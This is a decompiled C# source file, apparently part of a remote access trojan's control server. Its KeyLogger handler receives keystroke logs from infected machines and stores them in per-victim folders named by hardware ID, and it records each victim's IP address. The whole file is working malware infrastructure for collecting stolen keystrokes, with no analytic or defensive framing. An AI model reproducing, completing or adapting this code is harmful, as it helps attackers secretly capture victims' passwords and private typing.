using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000076 RID: 118
	public class KeyLogger
	{
		// Token: 0x0600030D RID: 781 RVA: 0x00021740 File Offset: 0x0001F940
		public KeyLogger(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Keylogger");
				string asString = unpack_msgpack.ForcePathObject("logs").AsString;
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllText(text + "\\KeyLogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine).Replace("[ENTER]", Environment.NewLine).Replace("[SPACE]", " "));
				new HandleLogs().Addmsg(string.Concat(new string[]
				{
					"Client ",
					client.Ip,
					" keyLogger was saved successfully @ ClientsFolder \\ ",
					unpack_msgpack.ForcePathObject("Hwid").AsString,
					" \\ KeyLogger"
				}), Color.Purple);
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Red);
			}
		}
	}
}
